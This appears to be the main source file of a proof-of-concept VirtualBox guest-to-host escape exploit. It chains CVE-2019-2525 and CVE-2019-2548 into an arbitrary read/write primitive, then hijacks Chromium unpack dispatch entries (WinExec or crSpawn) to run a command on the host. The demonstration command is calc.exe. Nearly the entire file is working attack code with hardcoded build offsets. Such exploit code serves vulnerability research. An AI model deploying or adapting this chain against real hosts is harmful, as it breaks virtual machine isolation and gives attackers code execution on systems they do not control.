#include "main.h"
#include "misc.h"
#include "vbox3d.h"
#include "chromium.h"
#include <cstring>
#include <cmath>

#ifdef _WIN32
#include <Windows.h>
#else
#include <unistd.h>
#endif

// CVE-2019-2525
#include "oob-read.h"

// CVE-2019-2548
#include "integer-overflow.h"

typedef void(*_write)(uint64_t addr, uint64_t val);
typedef uint64_t(*_read)(uint64_t addr);
_write arb_write;
_read  arb_read;

void pwn_kernel32(const char* cmd, uint64_t addr_vboxsharedcropengl);
void pwn_crSpawn(const char* cmd, uint64_t addr_vboxsharedcropengl);
void sleep(int milliseconds);

int main() {
    vbox3d::init();

    LOG_INFO("leaking address of cr_server.MainContextInfo using CVE-2019-2525");
    uint64_t addr_vboxsharedcropengl = oob_read::leak_MainContextInfo(CRSERVER_MAINCONTEXTINFO_OFFSET);

    if (addr_vboxsharedcropengl == 0) {
        LOG_ERROR("failed to leak address");
        return -1;
    }

    LOG_INFO("obtain partial control over svcbuffer using CVE-2019-2548");
    if (!integer_overflow::obtain_partial_svcbuffer_control()) {
        LOG_ERROR("failed to obtain partial control");
        return -1;
    }

    LOG_INFO("converting OOB write into arbitrary write");
    if (!integer_overflow::obtain_full_svcbuffer_control()) {
        return -1;
    }

    LOG_INFO("using arbitrary write to create arbitrary read");
    if (!integer_overflow::obtain_arbitrary_rw(addr_vboxsharedcropengl)) {
        return -1;
    }

    LOG_SUCCESS("arbitrary rw primitive created");

    arb_write = (_write)integer_overflow::write;
    arb_read = (_read)integer_overflow::read;

    // pwn_kernel32("calc.exe", addr_vboxsharedcropengl);
    // Sleep(1000);
    pwn_crSpawn("calc.exe", addr_vboxsharedcropengl);
    sleep(1000);
    // pwn_interactive(addr_vboxsharedcropengl);

	LOG_INFO("done");

    vbox3d::destroy();
}

#ifdef PROD_BUILD

	#define KERNEL32_ISDEBUGGERPRESENT_IAT_OFFSET	0xD0030
	#define KERNEL32_ISDEBUGGERPRESENT_OFFSET		0x1E770
	#define KERNEL32_WINEXEC_OFFSET					0x5F0E0

	#define OGLHOSTCRUTIL_CRMEMCPY_IAT_OFFSET		0xD04C0
	#define OGLHOSTCRUTIL_CRMEMCPY_OFFSET			0x7E70
	#define OGLHOSTCRUTIL_CRSPAWN_OFFSET			0x011F90

#else
	#define KERNEL32_ISDEBUGGERPRESENT_IAT_OFFSET	0x147020
	#define KERNEL32_ISDEBUGGERPRESENT_OFFSET		0x1E770
	#define KERNEL32_WINEXEC_OFFSET					0x5F0E0

	#define OGLHOSTCRUTIL_CRMEMCPY_IAT_OFFSET		0x1484B8
	#define OGLHOSTCRUTIL_CRMEMCPY_OFFSET			0x00C8B0
	#define OGLHOSTCRUTIL_CRSPAWN_OFFSET			0x018440
#endif

void pwn_kernel32(const char* cmd, uint64_t addr_vboxsharedcropengl) {
    LOG_INFO("pwning via kernel32");

    LOG_INFO_INDENT( 1, "leaking relevant addresses");
	uint64_t _imp_IsDebuggerPresent = arb_read(addr_vboxsharedcropengl + KERNEL32_ISDEBUGGERPRESENT_IAT_OFFSET);
	uint64_t kernel32 = _imp_IsDebuggerPresent - KERNEL32_ISDEBUGGERPRESENT_OFFSET;
	uint64_t kernel32_WinExec = kernel32 + KERNEL32_WINEXEC_OFFSET;

	LOG_INFO_INDENT( 2, "kernel32!IsDebuggerPresentStub => " + to_hex_str((void*)_imp_IsDebuggerPresent));
	LOG_INFO_INDENT( 2, "kernel32 => " + to_hex_str((void*)kernel32));
	LOG_INFO_INDENT( 2, "kernel32!WinExec => " + to_hex_str((void*)kernel32_WinExec));

	LOG_INFO_INDENT( 1, "overwriting cr_unpackDispatch.CreateContext => kernel32!WinExec");
	arb_write(addr_vboxsharedcropengl + cr_unpackDispatch_OFFSET + cr_unpackDispatch_CreateContext_OFFSET, kernel32_WinExec);

	LOG_SUCCESS_INDENT( 1, "executing " + to_str(cmd));
	uint32_t u32ClientId = vbox3d::connect();
	uint32_t DISPLAY_NAME_LEN = 256;
	uint32_t create_context_msg[300];
	uint32_t nCmdShow = 1;
	memset((void*)create_context_msg, 0x00, 300);
	create_context_msg[0] = CR_MESSAGE_OPCODES;
	create_context_msg[1] = 0x00;
	create_context_msg[2] = 0x01;
	create_context_msg[3] = CR_EXTEND_OPCODE << 24;
	create_context_msg[4] = 0x00;
	create_context_msg[5] = CR_CREATECONTEXT_EXTEND_OPCODE;

	// copy command
	memcpy((char*)&create_context_msg[6], (char*)cmd, strlen(cmd));
	create_context_msg[(0x10 + DISPLAY_NAME_LEN + 8) / sizeof(uint32_t)] = nCmdShow;

	// trigger execution
	vbox3d::hgcm_write(u32ClientId, (uint8_t*)create_context_msg, sizeof(create_context_msg));
    
	vbox3d::disconnect(u32ClientId);
}

void pwn_crSpawn(const char* cmd, uint64_t addr_vboxsharedcropengl) {
    LOG_INFO("pwning via crSpawn");

    uint64_t _imp_crMemcpy = arb_read(addr_vboxsharedcropengl + OGLHOSTCRUTIL_CRMEMCPY_IAT_OFFSET);
	uint64_t oglhostcrutil = _imp_crMemcpy - OGLHOSTCRUTIL_CRMEMCPY_OFFSET;
	uint64_t oglhostcrutil_crSpawn = oglhostcrutil + OGLHOSTCRUTIL_CRSPAWN_OFFSET;

	LOG_INFO_INDENT( 2, "VBoxOGLhostcrutil!crMemcpy => " + to_hex_str((void*)_imp_crMemcpy));
	LOG_INFO_INDENT( 2, "VBoxOGLhostcrutil => " + to_hex_str((void*)oglhostcrutil));
	LOG_INFO_INDENT( 2, "VBoxOGLhostcrutil!crSpawn => " + to_hex_str((void*)oglhostcrutil_crSpawn));

	LOG_INFO_INDENT( 1, "overwriting cr_unpackDispatch.BoundsInfoCR => VBoxOGLhostcrutil!crSpawn");
	arb_write(addr_vboxsharedcropengl + cr_unpackDispatch_OFFSET + cr_unpackDispatch_BoundsInfoCR_OFFSET, oglhostcrutil_crSpawn);

	LOG_INFO_INDENT( 1, "preparing buffer to hold command");
	uint32_t u32ClientId_cmd = vbox3d::connect();
	uint64_t addr_cmd = integer_overflow::get_crclient_addr(u32ClientId_cmd);
	vbox3d::disconnect(u32ClientId_cmd);

	for (int i = 0; i < ceil(strlen(cmd)/sizeof(uint64_t)); i++) {
		arb_write(addr_cmd, ((uint64_t*)cmd)[i]);
	}

	LOG_SUCCESS_INDENT( 1, "executing " + to_str(cmd));
	uint32_t u32ClientId = vbox3d::connect();
	uint32_t bounds_info_msg[300];
	memset((void*)bounds_info_msg, 0x00, sizeof(bounds_info_msg));

	bounds_info_msg[0] = CR_MESSAGE_OPCODES;
	bounds_info_msg[1] = 0x00;
	bounds_info_msg[2] = 0x01;
	bounds_info_msg[3] = CR_BOUNDSINFOCR_OPCODE << 24;
	// everything up to args is ignored	
	// args start at 0x10
	bounds_info_msg[10] = addr_cmd & 0xffffffff;
	bounds_info_msg[11] = (addr_cmd >> 32);

	vbox3d::hgcm_write(u32ClientId, (uint8_t*)bounds_info_msg, sizeof(bounds_info_msg));
}


void sleep(int milliseconds) {
#ifdef _WIN32
	Sleep(milliseconds);
#else
	usleep(milliseconds*1000);
#endif
}

